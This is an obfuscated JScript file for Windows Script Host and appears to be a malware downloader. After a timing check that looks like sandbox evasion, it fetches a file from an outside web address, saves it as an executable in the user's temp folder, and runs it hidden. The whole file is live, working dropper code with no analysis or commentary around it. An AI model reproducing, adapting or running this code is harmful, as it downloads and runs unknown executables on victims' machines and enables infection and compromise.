var Zzvvyhqijg = false;
var Rytcsvcf = "CreateObject";
var Ucoxqsa = function Nnxmlbthb() {return WScript[Rytcsvcf]("WScript.Shell");}();
var Tknisd = 123213;
var Yaxypagzdc = "MSXML2.XMLHTTP";
var Tdhjpov = 2123213;
var Nrmvgbt = 0;
function Wmfayg(Vjmthn){Ucoxqsa["Run"](Vjmthn, Nrmvgbt, Nrmvgbt);};
function Rhojxp(){return Yaxypagzdc;};
function Qdrdktgdp(Krypv, Unvxjm){return Krypv - Unvxjm;};
function Qudezebkz(){return Rytcsvcf;};
/*@cc_on
  @if (@_win32 || @_win64)
    Zzvvyhqijg = true;
  @end
@*/
var Gezfasxf = "";
if (Zzvvyhqijg)
{
function Zaiec(){return 22;};
var Twiqzzvknx = 0; var Loqibc = 0;
function Hrrepdouf()
{
var Itgkseea = new this["Date"]();
var Hhikiuz = Itgkseea["getUTCMilliseconds"]();
WScript["Sleep"](Zaiec());
var Itgkseea = new this["Date"]();
var Qvdelospl = Itgkseea["getUTCMilliseconds"]();
WScript["Sleep"](Zaiec());
var Itgkseea = new this["Date"]();
var Rthpvjlny = Itgkseea["getUTCMilliseconds"]();
var Twiqzzvknx = "Jbiyzzntjk";
Twiqzzvknx = Qdrdktgdp(Qvdelospl, Hhikiuz);
var Loqibc = "Dmoyo";
Loqibc = Qdrdktgdp(Rthpvjlny, Qvdelospl);
Gezfasxf = "open";
return Qdrdktgdp(Twiqzzvknx, Loqibc);
}
var Zkmexfdqsv = false;
var Qwkma = false;
for (var Phbmuq = Nrmvgbt; Phbmuq < Zaiec() * 1; Phbmuq++){if (Hrrepdouf() != Nrmvgbt){
Zkmexfdqsv = true; 
Loqibc = "07t9gasdf76ags" + 123313 * Twiqzzvknx + Loqibc; 
Qwkma = true; 
Loqibc = "07t9gasdf76ags" + 123313 * Twiqzzvknx + Loqibc; 
break;
}}
function Prwchuapc() {return ((Zkmexfdqsv == true) && (Zkmexfdqsv == Qwkma)) ? 1 : Nrmvgbt;};
if (Zkmexfdqsv && Prwchuapc() && Qwkma){
function Havvww() {return Ucoxqsa["ExpandEnvironmentStrings"]("%TEMP%/") + "tM18aI0XOB.exe";};
 Sqhuf = Rhojxp();
 Ecrwsaohkm = WScript[Rytcsvcf](Sqhuf);
 var Zbhmgnzza = 1;
 while (Zbhmgnzza){
try {
Ecrwsaohkm[Gezfasxf]("GET", "http://www.hiveclick.com/m4usd", false);
Ecrwsaohkm["send"]();
Jmxhqswnkq = "Sleep";
do {WScript[Jmxhqswnkq](Zaiec() * 11)} while (Ecrwsaohkm["readystate"] < 4 );
Zbhmgnzza = Nrmvgbt;
} catch(Pxgqjbxq){Zbhmgnzza = ("asdfa", "fadfasdf", "afdafa", 2);};
}
function Rtdmkfji(Qwbucfgc) {var Jvafygq = (1, 2, 3, 4, 5, Qwbucfgc); return Jvafygq;};
Wutaozuh = WScript[Qudezebkz()]("ADODB.Stream");
Sqhuf = Wutaozuh;
Sqhuf[Gezfasxf]();
Sqhuf["type"] = Rtdmkfji(1);
Sqhuf["write"](Ecrwsaohkm["ResponseBody"]);
Wutaozuh["position"] = Rtdmkfji(Nrmvgbt);
Sqhuf["SaveToFile"](Havvww(), Rtdmkfji(2) );
Wutaozuh["close"]();
Wmfayg(Havvww());
}
}

